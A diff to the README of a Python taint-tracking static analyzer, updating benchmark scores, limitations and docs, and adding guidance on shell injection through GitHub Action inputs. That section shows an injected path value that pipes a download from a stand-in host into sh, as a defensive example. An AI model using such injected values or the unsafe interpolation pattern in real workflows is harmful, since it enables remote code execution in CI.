@@ -8,11 +8,11 @@
 sinkline is a static analyzer for Python web apps (Flask, FastAPI, Django, aiohttp). It follows
 attacker-controlled input across functions and files and reports it only when it reaches a dangerous
 sink (SQL, shell, `eval`, file paths, redirects, deserialization, ...) without a sanitizer for that
-bug class. I wrote it because pattern linters flag every `cursor.execute` and reviewers stop reading.
+bug class. It exists because pattern linters flag every `cursor.execute` and reviewers stop reading.
 
 | 109 hand-labeled lines in `bench/corpus/` | TP | FP | FN | precision | recall | F1 |
 |---|---|---|---|---|---|---|
-| sinkline 0.4.0 | 59 | 0 | 2 | 1.000 | 0.967 | 0.983 |
+| sinkline 0.4.1 | 60 | 0 | 1 | 1.000 | 0.984 | 0.992 |
 | bandit 1.9.4 (lenient) | 33 | 20 | 28 | 0.623 | 0.541 | 0.579 |
 
 Pure Python on the standard `ast` module, zero dependencies. 42 rules mapped to OWASP 2021 and CWE;
@@ -33,7 +33,7 @@ $ sinkline scan vulpy        # fportantier/vulpy @ 5249cc8, first of 3 findings
 ```
 
 The source is in one file and the SQL is built in another. On the same project it reports nothing in
-the `good/` tree, which defines the same function names. The benchmark is small and labeled by me;
+the `good/` tree, which defines the same function names. The benchmark is small and was labeled by the repository author;
 see [Limitations](#limitations) before reading much into it.
 
 ## Contents
@@ -156,13 +156,15 @@ false positive when a `SAFE` line produces any finding. No findings land on unla
 
 | tool | TP | FP | FN | TN | precision | recall | F1 |
 |---|---|---|---|---|---|---|---|
+| sinkline 0.4.1 | 60 | 0 | 1 | 48 | 1.000 | 0.984 | 0.992 |
 | sinkline 0.4.0 | 59 | 0 | 2 | 48 | 1.000 | 0.967 | 0.983 |
 | sinkline 0.3.0 | 58 | 1 | 3 | 47 | 0.983 | 0.951 | 0.967 |
 | bandit (lenient: any hit on a vulnerable line counts) | 33 | 20 | 28 | 28 | 0.623 | 0.541 | 0.579 |
 
-- sinkline's 2 FN are labeled known limits in `hard_app.py`: a closure capturing a tainted local
-  (`:211`) and taint passed between requests through a module global (`:224`), both CWE-89. Per-CWE
-  counts are in `python bench/score.py`.
+- sinkline's one FN is a labeled known limit in `hard_app.py`: taint passed between requests through a
+  module global (`:224`, CWE-89). Per-CWE counts are in `python bench/score.py`.
+- 0.4.0 to 0.4.1: the closure FN at `hard_app.py:211` is found (a nested `def` now sees taint from
+  the enclosing function). No other line changed.
 - 0.3.0 to 0.4.0: the FP at `hard_app.py:84` is gone (key-sensitive dict literals) and the FN at
   `:183` is found (instance fields across methods). See [CHANGELOG.md](CHANGELOG.md).
 - The bandit row was re-run with bandit 1.9.4; earlier runs with 1.8.3 and 1.8.6 gave the same
@@ -172,7 +174,7 @@ false positive when a `SAFE` line produces any finding. No findings land on unla
   data-flow model. Its 20 false positives are mostly rules that fire on any string-built SQL
   (B608 x10) or any `subprocess` import/call (B603/B607/B602/B605) even on the labeled-safe variants,
   and its misses sit in categories where it has no taint-based rule (labeled SQLi 9, XSS 5, path
-  traversal 5, open redirect 4, command injection 3). I have not benchmarked against Semgrep or
+  traversal 5, open redirect 4, command injection 3). It has not been benchmarked against Semgrep or
   CodeQL.
 
 ### Public projects
@@ -210,8 +212,8 @@ To see it on the benchmark instead of your own code:
 git clone https://github.com/samiali38183/sinkline && cd sinkline
 pip install -e ".[dev]"
 sinkline scan bench/corpus/flask_app.py          # 21 findings, each with its flow
-pytest -q                                        # 46 tests including the corpus gate
-python bench/score.py                            # precision 1.000  recall 0.967  F1 0.983
+pytest -q                                        # 91 tests including the corpus gate
+python bench/score.py                            # precision 1.000  recall 0.984  F1 0.992
 ```
 
 ## Usage
@@ -241,6 +243,29 @@ As a GitHub Action:
     path: .
     fail-on: high
 ```
+
+#### Using the GitHub Action safely
+
+Workflow inputs are untrusted text. Writing `${{ inputs.path }}` inside a `run:` block pastes the
+value into the shell script before bash parses it, so an input can become code. The action passes
+inputs through `env:` and uses them quoted:
+
+```yaml
+# unsafe: with path = ". ; curl https://evil.example | sh" the shell runs the second command
+- run: sinkline scan ${{ inputs.path }} --fail-on ${{ inputs.fail-on }}
+
+# safe: the value is data in an environment variable, quoted, one argv entry
+- env:
+    INPUT_PATH: ${{ inputs.path }}
+  run: sinkline scan "$INPUT_PATH"
+```
+
+`fail-on` and `min-confidence` are also checked against an allow-list (`low|medium|high|critical`
+and `low|medium|high`) and the job fails with an error on anything else. `tests/test_action.py` runs
+`scripts/action-scan.sh` with hostile values and checks that nothing is executed and that each
+input reaches the CLI as a single argument. The same rule applies to your own workflows: never put
+`${{ github.event.* }}` or `${{ inputs.* }}` directly in `run:`. Versions before 0.4.1 used the
+unsafe form; pin the action to a commit or tag, not `@main`.
 
 As a [pre-commit](https://pre-commit.com) hook, in `.pre-commit-config.yaml`:
 
@@ -281,14 +306,15 @@ for f in res.findings:
 
 ## Limitations
 
-- **Small, self-labeled benchmark.** 109 lines, labeled by me, and I also wrote the engine. The
+- **Small, self-labeled benchmark.** 109 lines, labeled by the same person who wrote the engine. The
   corpus doubles as a regression suite (the CI floor is the recorded score), so the headline numbers
   are best read as "no regressions, and the design limits are visible", not as a generalization
   estimate. Two of the 0.4.0 changes were written to fix lines in this corpus, which is exactly why
   it should not be read as a held-out score. The public-project scans are the more independent
   check, but they are unlabeled and few.
 - **Known design limits** (labeled `known FN` in `bench/corpus/hard_app.py`):
-  - closures capturing tainted variables;
+  - closures that are returned and called elsewhere, and variables assigned in the enclosing
+    function after the nested `def` (a nested `def` sees the enclosing taint as of its definition);
   - module globals shared across requests (`CACHE["q"] = tainted` in one handler, read in another);
   - dynamic dispatch, `getattr`, `exec`-generated code, decorators that rewrite arguments.
 - **Instance fields are per class, not per object.** No inheritance, no aliasing (`other = self`),
@@ -316,7 +342,7 @@ Directions that follow from the limits above; none are implemented:
 
 ```bash
 pip install -e ".[dev]"
-pytest -q                       # 46 tests: engine unit tests plus the corpus gate
+pytest -q                       # 91 tests: engine unit tests plus the corpus gate
 python bench/score.py -v        # corpus P/R/F1, per-CWE table, per-line FP/FN listing
 pip install ruff mypy && ruff check . && mypy
 pip install bandit && python bench/compare_bandit.py
@@ -333,7 +359,8 @@ bench/
   corpus/       labeled ground truth (VULN:CWE-xx / SAFE tags) incl. cross-file + adversarial cases
   score.py      precision / recall / F1 per CWE
   compare_bandit.py
-tests/          unit tests (one small program per engine feature) + corpus gate
+tests/          unit tests (one small program per engine feature) + corpus gate + action tests
+scripts/        action-scan.sh, the script action.yml runs
 docs/DESIGN.md  design write-up
 docs/examples/  real scan output (vulpy, Vulnerable-Flask-App, dvpwa, corpus as HTML and SARIF)
 .pre-commit-hooks.yaml   pre-commit hook definition
